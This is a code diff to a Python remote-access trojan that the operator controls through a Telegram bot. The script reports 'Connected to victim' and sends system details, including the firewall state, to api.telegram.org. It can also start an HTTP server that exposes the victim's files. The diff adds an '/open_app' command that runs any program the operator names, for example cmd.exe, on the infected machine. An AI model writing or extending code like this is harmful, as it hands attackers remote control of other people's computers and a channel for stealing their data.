@@ -1,5 +1,5 @@
 import requests
-from os import chdir, getcwd, remove
+from os import chdir, getcwd, remove, startfile
 from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
 cwd = getcwd()
 def check_internret():
@@ -54,7 +54,8 @@ if check_internret():
                 "/process",
                 "/chruns",
                 "/drivers",
-                "/localhost"]
+                "/localhost", 
+                "/open_app"]
     def send_msg(message, token=token, id=id):
         try:
             url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
@@ -348,6 +349,15 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                         Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
                         send_msg(f"Localhost is started at: http://{local_ip}:{port}")
                     except: send_msg("Error;")
+                if command == "/open_app":
+                    send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
+                    sleep(10)
+                    name = read_msg()
+                    try:
+                        startfile(name)
+                        send_msg(f"{name} application is opened.")
+                    except FileNotFoundError:
+                        send_msg("File not found.")
                 send_msg("click /pass")
                 sleep(5)
     send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
